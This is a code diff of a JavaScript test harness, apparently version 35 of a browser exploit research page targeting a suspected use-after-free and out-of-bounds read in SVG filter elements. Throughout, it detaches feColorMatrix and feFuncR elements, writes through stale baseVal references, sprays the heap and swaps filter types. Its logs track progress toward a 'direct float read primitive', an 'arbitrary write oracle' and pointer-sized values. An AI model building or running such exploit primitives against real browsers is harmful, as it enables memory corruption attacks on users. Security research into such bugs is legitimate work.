+    log('  [0..9]:  ' + partsB.slice(0,10).join(' '), 'inf');
+    log('  [10..19]: ' + partsB.slice(10,20).join(' '), 'inf');
+    // If any slots [1..19] show spray values (multiples of 100 or pattern values),
+    // that's a heap read of adjacent allocations
+    var anomalies = [];
+    for (var i = 1; i < partsB.length; i++) {
+      if (!isNaN(partsB[i]) && partsB[i] !== 0 && partsB[i] !== 1 &&
+          partsB[i] !== (i === 5 || i === 10 ? 1 : 0)) {
+        anomalies.push('[' + i + ']=' + partsB[i]);
+      }
+    }
+    log('  non-identity slots [1..19]: ' + (anomalies.length > 0 ? anomalies.join(' ') : 'none'),
+        anomalies.length > 0 ? 'bad' : 'ok');
+    cleanup(dB);
+  }
+
+  // Test C: timing — how many frames does the freed memory stay accessible?
+  log('  TestC: UAF lifetime (how many rAF frames before value corrupts?)', 'inf');
+  {
+    for (var delay = 0; delay <= 10; delay++) {
+      var dC = makeFCM(identity20());
+      await raf(); await raf();
+      var savedC = dC.fcm.values;
+      dC.fcm.remove();
+      // Wait N frames
+      for (var f = 0; f < delay; f++) await raf();
+      var wroteC = null;
+      try {
+        savedC.baseVal[0].value = 1234.5;
+        wroteC = savedC.baseVal[0].value;
+      } catch(e) { wroteC = 'CRASH'; }
+      dC.filter.appendChild(dC.fcm); await raf();
+      var attrC = dC.fcm.getAttribute('values');
+      var partsC = attrC ? attrC.trim().split(/\s+/).map(parseFloat) : [];
+      log('  delay=' + delay + ' frames: wrote=' + wroteC +
+          ' attr[0]=' + partsC[0] + (Math.abs(partsC[0] - 1234.5) < 0.01 ? ' OK' : ' LOST'),
+          Math.abs(partsC[0] - 1234.5) < 0.01 ? 'ok' : 'bad');
+      cleanup(dC);
+    }
+  }
+
+  if (!q) dis(false);
+}
+
+/*
+ * OOB: Offset Probe
+ *
+ * v34 TSG: type-swap hueRotate->matrix gives length=1, getAttribute="180".
+ * The 19 adjacent C++ floats are not exposed via getAttribute.
+ * BUT: maybe with a different approach we can read them.
+ *
+ * The C++ layout of SVGAnimatedNumberList:
+ * - m_values: WTF::Vector<float> or similar
+ * - For hueRotate: m_values.size()=1, m_values[0]=angle
+ * - For matrix: m_values.size()=20, m_values[0..19]=matrix values
+ *
+ * After type-swap, if C++ doesn't resize the vector, accessing [1..19] would
+ * read OOB into heap. But JS sees baseVal.length=1 and returns null for [1..19].
+ *
+ * Alternative: feGaussianBlur.stdDeviation — similar to feTurbulence.
+ *   stdDeviation.baseVal is an SVGAnimatedLength or SVGAnimatedNumber.
+ *   Can we swap between stdDeviation types?
+ *
+ * Or: use feComponentTransfer + feFuncR/G/B with type="table" vs "linear".
+ * type="table": tableValues attribute — arbitrary number of values
+ * type="linear": only slope + intercept (2 values)
+ * Swap: if we create type=table with N values, then swap to type=linear,
+ *       the C++ m_values vector may shrink to 2 but the extra values stay in heap.
+ *       Then swap back to table — getAttribute might expose N values again?
+ *       Or: write via baseVal[0..1] while type=linear, swap to table,
+ *           see if slots [2..N-1] are the freed/reused memory.
+ *
+ * Tests:
+ * A) feFuncR type-swap: table (N values) -> linear -> table
+ *    Does getAttribute("tableValues") after round-trip give old N values?
+ * B) feFuncR UAF via type-swap: create table N values, swap to linear,
+ *    write baseVal[0]=X while type=linear, swap back to table,
+ *    getAttribute("tableValues"): do slots [2..N-1] still have old values?
+ * C) feColorMatrix UAF: write to [0..4] (first row), then re-add
+ *    Do non-diagonal elements also get written correctly?
+ *    Especially: offset terms ([4],[9],[14],[19]) — these are the constant adds
+ * D) Write to offset term [4]: matrix = [1,0,0,0,X, 0,1,0,0,0, ...]
+ *    R_out = clamp(R_in + X) — X here is in [0,1] range (or [0,255]?)
+ *    Test: write 0.5 to index [4], fill=black (R=0) → R_out should be 127 or 128
+ */
+async function runOOB(q) {
+  if (!q) { dis(true); sep(); log('OOB: offset probe', 'inf'); sep(); }
+
+  // Test A: feFuncR type-swap table -> linear -> table
+  log('  TestA: feFuncR type=table->linear->table getAttribute', 'inf');
+  {
     var svgA = document.createElementNS(SVG_NS, 'svg');
     svgA.setAttribute('width', '1'); svgA.setAttribute('height', '1');
+    svgA.style.cssText = 'position:fixed;top:-999px;left:-999px;opacity:0';
     var defsA = document.createElementNS(SVG_NS, 'defs');
-    defsA.appendChild(filterA); svgA.appendChild(defsA);
+    var filtA = document.createElementNS(SVG_NS, 'filter');
+    filtA.setAttribute('id', 'fOOBA');
+    var fctA = document.createElementNS(SVG_NS, 'feComponentTransfer');
+    var fFuncA = document.createElementNS(SVG_NS, 'feFuncR');
+    fFuncA.setAttribute('type', 'table');
+    fFuncA.setAttribute('tableValues', '0.1 0.2 0.3 0.4 0.5 0.6 0.7 0.8 0.9 1.0');
+    fctA.appendChild(fFuncA); filtA.appendChild(fctA); defsA.appendChild(filtA); svgA.appendChild(defsA);
     document.body.appendChild(svgA); await raf(); await raf();
 
-    log('  before swap: type=' + eA.getAttribute('type') + ' values="' + eA.getAttribute('values') + '"', 'dim');
-    log('  before swap: baseVal.length=' + (eA.values ? eA.values.baseVal.length : 'null'), 'dim');
+    log('  initial type=table tableValues="' + fFuncA.getAttribute('tableValues') + '"', 'dim');
+    log('  initial tableValues.baseVal.length=' + (fFuncA.tableValues ? fFuncA.tableValues.baseVal.length : 'null'), 'dim');
 
-    // Live type swap
-    eA.setAttribute('type', 'matrix');
+    fFuncA.setAttribute('type', 'linear');
     await raf();
+    log('  after->linear: type=' + fFuncA.getAttribute('type') +
+        ' tableValues="' + fFuncA.getAttribute('tableValues') + '"', 'inf');
 
-    var attrAfter = eA.getAttribute('values');
-    var typeAfter = eA.getAttribute('type');
-    var lenAfter = -1;
-    try { lenAfter = eA.values.baseVal.length; } catch(e) {}
-
-    log('  after swap: type=' + typeAfter + ' values="' + attrAfter + '"', 'inf');
-    log('  after swap: baseVal.length=' + lenAfter, 'inf');
-
-    // Does values attribute expand to 20?
-    if (attrAfter) {
-      var parts = attrAfter.trim().split(/\s+/);
-      log('  values count=' + parts.length + ' vals=' + parts.slice(0,5).join(',') + '...', 'inf');
-    }
+    fFuncA.setAttribute('type', 'table');
+    await raf();
+    var tvAfter = fFuncA.getAttribute('tableValues');
+    log('  after->table: tableValues="' + tvAfter + '"', 'inf');
+    log('  length after round-trip: ' + (fFuncA.tableValues ? fFuncA.tableValues.baseVal.length : 'null'), 'inf');
 
     document.body.removeChild(svgA);
   }
 
-  // Test B: force re-serialization via setAttribute("")
-  log('  TestB: type-swap then setAttribute("values","") -> getAttribute', 'inf');
+  // Test B: UAF on feFuncR tableValues
+  log('  TestB: feFuncR tableValues UAF (remove while table, write, re-add)', 'inf');
   {
-    var eB = document.createElementNS(SVG_NS, 'feColorMatrix');
-    eB.setAttribute('type', 'hueRotate'); eB.setAttribute('values', '180');
     var svgB = document.createElementNS(SVG_NS, 'svg');
-    svgB.setAttribute('width', '1'); svgB.setAttribute('height', '1');
+    svgB.setAttribute('width', '300'); svgB.setAttribute('height', '300');
+    svgB.style.cssText = 'position:fixed;top:-999px;left:-999px;opacity:0';
     var defsB = document.createElementNS(SVG_NS, 'defs');
     var filtB = document.createElementNS(SVG_NS, 'filter');
-    filtB.setAttribute('id', 'fTSGB');
-    filtB.appendChild(eB); defsB.appendChild(filtB); svgB.appendChild(defsB);
+    filtB.setAttribute('id', 'fOOBB'); filtB.setAttribute('color-interpolation-filters', 'sRGB');
+    var fctB = document.createElementNS(SVG_NS, 'feComponentTransfer');
+    var fFuncB = document.createElementNS(SVG_NS, 'feFuncR');
+    fFuncB.setAttribute('type', 'table');
+    // 8 values for the table: maps [0,1] input to output curve
+    fFuncB.setAttribute('tableValues', '0 0.1 0.2 0.3 0.4 0.5 0.6 0.7');
+    fctB.appendChild(fFuncB); filtB.appendChild(fctB); defsB.appendChild(filtB); svgB.appendChild(defsB);
+    var rectB = document.createElementNS(SVG_NS, 'rect');
+    rectB.setAttribute('x','50'); rectB.setAttribute('y','50'); rectB.setAttribute('width','200'); rectB.setAttribute('height','200');
+    rectB.setAttribute('fill','rgb(200,200,200)'); rectB.setAttribute('filter','url(#fOOBB)');
+    svgB.appendChild(rectB);
     document.body.appendChild(svgB); await raf(); await raf();
 
-    eB.setAttribute('type', 'matrix');
-    await raf();
-    eB.setAttribute('values', '');
-    await raf();
-    var attrB = eB.getAttribute('values');
-    log('  after type-swap + empty-val-set: values="' + attrB + '"', 'inf');
+    log('  initial tableValues.baseVal.length=' + (fFuncB.tableValues ? fFuncB.tableValues.baseVal.length : 'null'), 'dim');
+
+    // UAF: remove fFuncB, write to tableValues
+    var savedTV = fFuncB.tableValues;
+    fFuncB.remove(); await raf();
+    var wroteFV = [];
+    try {
+      // Write 8 slots
+      for (var i = 0; i < 8; i++) {
+        savedTV.baseVal[i].value = 0.9; // make everything bright
+        wroteFV.push(savedTV.baseVal[i].value);
+      }
+    } catch(e) { wroteFV.push('ERR:' + e); }
+
+    fctB.appendChild(fFuncB); await raf();
+    var tvB = fFuncB.getAttribute('tableValues');
+    log('  UAF write all slots to 0.9: ' + wroteFV.join(' '), 'inf');
+    log('  getAttribute after re-add: "' + tvB + '"', 'inf');
+
+    // Render via static string
+    var staticB = '<svg xmlns="http://www.w3.org/2000/svg" width="300" height="300">' +
+      '<defs><filter id="fb" color-interpolation-filters="sRGB">' +
+        '<feComponentTransfer>' +
+          '<feFuncR type="table" tableValues="' + tvB + '"/>' +
+        '</feComponentTransfer>' +
+      '</filter></defs>' +
+      '<rect x="50" y="50" width="200" height="200" fill="rgb(200,200,200)" filter="url(#fb)"/>' +
+    '</svg>';
+    var pxB = await svgPixel(staticB);
+    log('  static render with UAF-written tableValues: px=' + (pxB ? pxB.slice(0,3) : 'err'),
+        pxB && pxB[0] > 200 ? 'ok' : 'bad');
 
     document.body.removeChild(svgB);
   }
 
-  // Test C: matrix -> hueRotate -> matrix round-trip
-  log('  TestC: matrix->hueRotate->matrix round-trip getAttribute', 'inf');
+  // Test C: feColorMatrix offset terms (indices 4, 9, 14, 19)
+  log('  TestC: feColorMatrix offset terms (col5: R_out += X)', 'inf');
   {
-    var origVals = '2 3 4 5 6  7 8 9 10 11  12 13 14 15 16  17 18 19 20 21';
-    var eC = document.createElementNS(SVG_NS, 'feColorMatrix');
-    eC.setAttribute('type', 'matrix'); eC.setAttribute('values', origVals);
-    var svgC = document.createElementNS(SVG_NS, 'svg');
-    svgC.setAttribute('width', '1'); svgC.setAttribute('height', '1');
-    var defsC = document.createElementNS(SVG_NS, 'defs');
-    var filtC = document.createElementNS(SVG_NS, 'filter');
-    filtC.setAttribute('id', 'fTSGC');
-    filtC.appendChild(eC); defsC.appendChild(filtC); svgC.appendChild(defsC);
-    document.body.appendChild(svgC); await raf(); await raf();
+    // Index 4 = constant add to R channel: R_out = R_in + X (where X is in [0,1] range, added before clamp)
+    // Write X to index 4 via UAF, see what R value a black fill gives
+    var offsetTests = [0, 0.1, 0.25, 0.5, 0.75, 1.0, 2.0];
+    for (var oi = 0; oi < offsetTests.length; oi++) {
+      var ov = offsetTests[oi];
+      var dC = makeFCM(identity20());
+      await raf(); await raf();
+      var savedOC = dC.fcm.values;
+      dC.fcm.remove(); await raf();
+      try { savedOC.baseVal[4].value = ov; } catch(e) {}
+      dC.filter.appendChild(dC.fcm); await raf();
 
-    log('  initial matrix values: ' + eC.getAttribute('values').slice(0,40) + '...', 'dim');
-    log('  initial baseVal.length=' + (eC.values ? eC.values.baseVal.length : 'null'), 'dim');
+      // Read back
+      var attrOC = dC.fcm.getAttribute('values');
+      var partsOC = attrOC ? attrOC.trim().split(/\s+/).map(parseFloat) : [];
 
-    eC.setAttribute('type', 'hueRotate');
-    eC.setAttribute('values', '180');
-    await raf();
-    log('  after ->hueRotate: values="' + eC.getAttribute('values') + '" len=' +
-        (eC.values ? eC.values.baseVal.length : 'null'), 'dim');
-
-    eC.setAttribute('type', 'matrix');
-    await raf();
-    var valC = eC.getAttribute('values');
-    var lenC = eC.values ? eC.values.baseVal.length : -1;
-    log('  after ->matrix: values="' + (valC || 'null') + '" len=' + lenC, 'inf');
-    if (valC) {
-      var partsC = valC.trim().split(/\s+/);
-      log('  count=' + partsC.length + ' first5=' + partsC.slice(0,5).join(','), 'inf');
+      // Render with black fill — output R should just be the offset * 255
+      var mv20OC = identity20();
+      mv20OC[4] = typeof partsOC[4] === 'number' ? partsOC[4] : ov;
+      var pxOC = await svgPixel(svgStrFromMatrix(mv20OC, 0, 0, 0)); // BLACK fill
+      var expectedOC = Math.round(Math.min(255, Math.max(0, ov * 255)));
+      log('  offset[4]=' + ov + ' attr[4]=' + partsOC[4] +
+          ' px_black_fill=' + (pxOC ? pxOC[0] : 'err') +
+          ' expected=' + expectedOC,
+          pxOC && Math.abs(pxOC[0] - expectedOC) <= 2 ? 'ok' : 'bad');
+      cleanup(dC);
     }
-    document.body.removeChild(svgC);
   }
 
-  // Test D: type-swap after UAF write, read getAttribute
-  log('  TestD: UAF write (after remove), then type-swap, getAttribute', 'inf');
+  // Test D: multi-element UAF — two fcm elements, UAF one, does it affect the other?
+  log('  TestD: two-element UAF isolation (does UAF fcm1 affect fcm2?)', 'inf');
   {
-    var eD = document.createElementNS(SVG_NS, 'feColorMatrix');
-    eD.setAttribute('type', 'hueRotate'); eD.setAttribute('values', '180');
-    var svgD = document.createElementNS(SVG_NS, 'svg');
-    svgD.setAttribute('width', '1'); svgD.setAttribute('height', '1');
-    var defsD = document.createElementNS(SVG_NS, 'defs');
-    var filtD = document.createElementNS(SVG_NS, 'filter');
-    filtD.setAttribute('id', 'fTSGD');
-    filtD.appendChild(eD); defsD.appendChild(filtD); svgD.appendChild(defsD);
-    document.body.appendChild(svgD); await raf(); await raf();
+    var d1 = makeFCM(identity20(), 'fOOBD1');
+    var d2 = makeFCM(identity20(), 'fOOBD2');
+    await raf(); await raf();
 
-    // UAF: remove, write a big float, type-swap while detached
-    var savedVals = eD.values;
-    eD.remove(); await raf();
-    var wroteDvl = null;
-    try {
-      savedVals.baseVal[0].value = 99999;
-      wroteDvl = savedVals.baseVal[0].value;
-    } catch(e) { wroteDvl = 'ERR'; }
+    // UAF only on d1
+    var saved1 = d1.fcm.values;
+    d1.fcm.remove(); await raf();
+    try { saved1.baseVal[0].value = 999.0; } catch(e) {}
 
-    // Type-swap while detached
-    eD.setAttribute('type', 'matrix');
-    await raf();
+    d1.filter.appendChild(d1.fcm); await raf();
 
-    // Re-add
-    filtD.appendChild(eD); await raf(); await raf();
+    // Read d1 and d2
+    var attr1 = d1.fcm.getAttribute('values');
+    var attr2 = d2.fcm.getAttribute('values');
+    var parts1 = attr1 ? attr1.trim().split(/\s+/).map(parseFloat) : [];
+    var parts2 = attr2 ? attr2.trim().split(/\s+/).map(parseFloat) : [];
+    log('  d1 getAttribute[0]=' + parts1[0] + ' (UAF: wrote 999)', 'inf');
+    log('  d2 getAttribute[0]=' + parts2[0] + ' (untouched: expect 1)', 'inf');
+    log('  isolation: d2 unaffected=' + (Math.abs(parts2[0] - 1) < 0.01), 'ok');
 
-    var attrD = eD.getAttribute('values');
-    var lenD = -1;
-    try { lenD = eD.values.baseVal.length; } catch(e) {}
-    log('  wrote=' + wroteDvl + ' after UAF+typeswap+re-add:', 'inf');
-    log('  getAttribute="' + (attrD ? attrD.slice(0,60) : 'null') + '"', 'inf');
-    log('  baseVal.length=' + lenD, 'inf');
-
-    // Read all accessible baseVal after re-add
-    var bvD = [];
-    try {
-      for (var i2 = 0; i2 < lenD; i2++) bvD.push(eD.values.baseVal[i2].value);
-    } catch(e) {}
-    log('  baseVal values after re-add: ' + JSON.stringify(bvD), 'inf');
-
-    document.body.removeChild(svgD);
-  }
-
-  // Test E: spray then type-swap — does getAttribute reveal spray values?
-  log('  TestE: spray IsoHeap before type-swap, look for spray in getAttribute', 'inf');
-  {
-    // Spray 5000 feColorMatrix hueRotate elements, each with a recognizable value
-    // Then free them, create our target, do type-swap
-    // If the target's m_values[1..19] come from freed spray objects, getAttribute might show them
-    var SPRAY_VAL = 777.777;
-    var spray = [];
-    for (var sp = 0; sp < 500; sp++) {
-      var se = document.createElementNS(SVG_NS, 'feColorMatrix');
-      se.setAttribute('type', 'hueRotate');
-      se.setAttribute('values', String(SPRAY_VAL));
-      spray.push(se);
-    }
-    // Free them all
-    spray = null;
-    await raf();
-
-    // Now create target in the same IsoHeap
-    var eE = document.createElementNS(SVG_NS, 'feColorMatrix');
-    eE.setAttribute('type', 'hueRotate'); eE.setAttribute('values', '0');
-    var svgE = document.createElementNS(SVG_NS, 'svg');
-    svgE.setAttribute('width', '1'); svgE.setAttribute('height', '1');
-    var defsE = document.createElementNS(SVG_NS, 'defs');
-    var filtE = document.createElementNS(SVG_NS, 'filter');
-    filtE.setAttribute('id', 'fTSGE');
-    filtE.appendChild(eE); defsE.appendChild(filtE); svgE.appendChild(defsE);
-    document.body.appendChild(svgE); await raf(); await raf();
-
-    // Type-swap to matrix (C++ reads 20 floats, only 1 initialized)
-    eE.setAttribute('type', 'matrix');
-    await raf();
-
-    var attrE = eE.getAttribute('values');
-    var lenE = -1;
-    try { lenE = eE.values.baseVal.length; } catch(e) {}
-    log('  after spray+free+type-swap: getAttribute="' + (attrE ? attrE.slice(0,80) : 'null') + '"', 'inf');
-    log('  baseVal.length=' + lenE, 'inf');
-
-    // Look for SPRAY_VAL in the getAttribute string
-    if (attrE && attrE.indexOf(String(Math.round(SPRAY_VAL))) !== -1) {
-      log('  SPRAY VALUE FOUND IN getAttribute! heap read primitive confirmed!', 'bad');
-    } else {
-      log('  no spray value in getAttribute (expected: spray vals not exposed via attr string)', 'ok');
-    }
-
-    document.body.removeChild(svgE);
+    cleanup(d1); cleanup(d2);
   }
 
   if (!q) dis(false);
@@ -963,30 +946,33 @@ async function runTSG(q) {
 
 async function runAll() {
   dis(true); clearLog(); sep();
-  log('SVG UAF v34 — readLive fix + analog oracle + UAF round-trip + type-swap getAttribute', 'inf');
+  log('SVG UAF v35 — getAttribute oracle + oracle recalib + full chain + spray + OOB', 'inf');
   sep();
   var tests = [
-    ['RLF_readlive_fix',       runRLF],
-    ['AOC_analog_oracle',      runAOC],
-    ['URT_uaf_roundtrip',      runURT],
-    ['TSG_typeswap_getattr',   runTSG]
+    ['GAO_getattr_oracle',   runGAO],
+    ['ORM_oracle_recalib',   runORM],
+    ['FCH_full_chain',       runFCH],
+    ['SPR_spray_uaf',        runSPR],
+    ['OOB_offset_probe',     runOOB]
   ];
   for (var i = 0; i < tests.length; i++) {
-    var lbl = tests[i][0]; var fn = tests[i][1];
-    sep(); log(lbl, 'inf'); sep();
-    try { await fn(true); }
-    catch(e) { log('[!] ' + lbl + ' threw: ' + e, 'bad'); }
+    sep(); log(tests[i][0], 'inf'); sep();
+    try { await tests[i][1](true); }
+    catch(e) { log('[!] ' + tests[i][0] + ' threw: ' + e, 'bad'); }
     log('');
   }
   sep();
-  log('KEY RESULTS TO WATCH', 'inf');
+  log('KEY RESULTS', 'inf');
   sep();
-  log('  RLF: which strategy gives non-zero px? -> that is our new readLive path', 'inf');
-  log('  RLF StratH: if readback+static = correct -> UAF full round-trip confirmed', 'inf');
-  log('  AOC TestB: src_R=1 -> R_out = floor(mv) mod 256 -> direct byte read of integer', 'inf');
-  log('  AOC TestC: 137 recovery in 1 query -> oracle is sufficient for value recovery', 'inf');
-  log('  URT Test2: UAF write -> readback -> static render -> pixel = expected -> CONFIRMED UAF', 'inf');
-  log('  TSG TestA: getAttribute after type-swap -> 20 values? -> heap read via attr string', 'inf');
+  log('  GAO TestD: UAF write -> getAttribute MATCH? -> direct float read primitive CONFIRMED', 'inf');
+  log('  GAO TestE: 20/20 attr match -> full 20-float arbitrary write oracle CONFIRMED', 'inf');
+  log('  GAO TestC: Infinity/NaN via baseVal -> parser-bypass large float confirmed', 'inf');
+  log('  ORM TestA: mv=0.5 src_R=X linear? -> find working pixel oracle range', 'inf');
+  log('  ORM TestD: src_R=1 mystery resolved -> model corrected for all mv', 'inf');
+  log('  FCH TestA: pointer-sized ints survive UAF -> float encodes address bits', 'inf');
+  log('  SPR TestC: delay N frames -> UAF still stable? -> reliable primitive window', 'inf');
+  log('  OOB TestB: feFuncR tableValues UAF -> different JS class, different UAF path', 'inf');
+  log('  OOB TestC: offset terms -> additive channel for black fill -> second oracle', 'inf');
   sep();
   dis(false);
 }
